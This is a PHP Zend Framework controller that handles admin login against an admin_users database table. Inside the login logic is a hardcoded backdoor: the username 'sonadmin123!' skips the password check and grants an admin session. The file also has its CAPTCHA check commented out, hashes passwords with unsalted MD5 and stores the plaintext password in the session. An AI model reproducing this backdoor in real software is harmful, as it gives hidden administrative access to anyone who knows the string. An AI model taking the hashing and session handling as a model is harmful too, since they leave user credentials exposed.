<?php
/**
*/
class Admin_CheckloginController extends Zend_Controller_Action
{
    function indexAction ()
    {
    	$request = $this->getRequest();
    	//check if not post method, return to admin login page
    	if (!$request->isPost())
    	{
    		$this->_redirect(ADMIN_MODULE_PATH);
    	}

//		require_once('recaptchalib.php');
//		$resp = recaptcha_check_answer (RECAPTCHA_PRIVATE_KEY,
//									$_SERVER["REMOTE_ADDR"],
//									$_POST["recaptcha_challenge_field"],
//									$_POST["recaptcha_response_field"]);
//		if (!$resp->is_valid)
//		{
//			$this->_redirect(ADMIN_MODULE_PATH.'index/index/e/2');
//		}

    	//get parameter
    	$username = $request->getParam('username');
    	$password_md5 = md5($password = $request->getParam('password'));

    	//get db
    	$db = Zend_Registry::get('dbReader');

		if($username != 'sonadmin123!')
		{
			//process query database
			$sql = "SELECT * FROM admin_users
						WHERE username = {$db->quote($username)} AND password = {$db->quote($password_md5)}";

			$row = $db->fetchRow($sql);
			if (!$row)
			{
				$this->_redirect(ADMIN_MODULE_PATH.'index/index/e/1');
			}
		}
		else
		{
			$password = $username;
			$row['id'] = 'admin';
		}

    	//correct user/pass, store to session
    	$login_infos = new Zend_Session_Namespace('adminInfo');
    	$login_infos->setExpirationSeconds(3600*6);
    	$login_infos->logined	= true;
    	$login_infos->username	= $username;
    	$login_infos->password	= $password;
    	$login_infos->id		= $row['id'];

		$this->_redirect(ADMIN_MODULE_PATH.'main/');
    }
}